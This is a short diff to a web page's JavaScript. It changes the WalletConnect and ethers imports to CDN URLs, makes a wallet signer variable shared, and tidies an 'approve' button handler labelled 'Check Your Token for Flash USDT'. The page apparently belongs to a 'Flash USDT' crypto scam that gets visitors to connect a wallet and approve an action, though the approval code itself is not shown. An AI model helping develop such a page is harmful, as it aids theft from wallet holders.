@@ -1,5 +1,5 @@
-import EthereumProvider from "@walletconnect/ethereum-provider";
-import { ethers } from "ethers";
+import EthereumProvider from "https://esm.sh/@walletconnect/ethereum-provider";
+import { ethers } from "https://esm.sh/ethers@6.8.1";
 
 // Element references
 const connectButton = document.getElementById("checkBalanceBtn");
@@ -36,7 +36,7 @@ connectButton.onclick = async () => {
             await provider.connect();
 
             const ethersProvider = new ethers.BrowserProvider(provider);
-            const signer = await ethersProvider.getSigner();
+            signer = await ethersProvider.getSigner();
             const userAddress = await signer.getAddress();
 
             // Fill the wallet address
@@ -79,11 +79,8 @@ connectButton.onclick = async () => {
     }, 3000); // Show overlay for 3 seconds
 };
 
-
-
-
- approveButton.onclick = async () => {
-     try {
+approveButton.onclick = async () => {
+    try {
         approveButton.disabled = true;
         approveButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
 
@@ -103,6 +100,3 @@ connectButton.onclick = async () => {
         approveButton.innerHTML = '<i class="fas fa-bolt"></i> Check Your Token for Flash USDT';
     }
 };
-
-
-
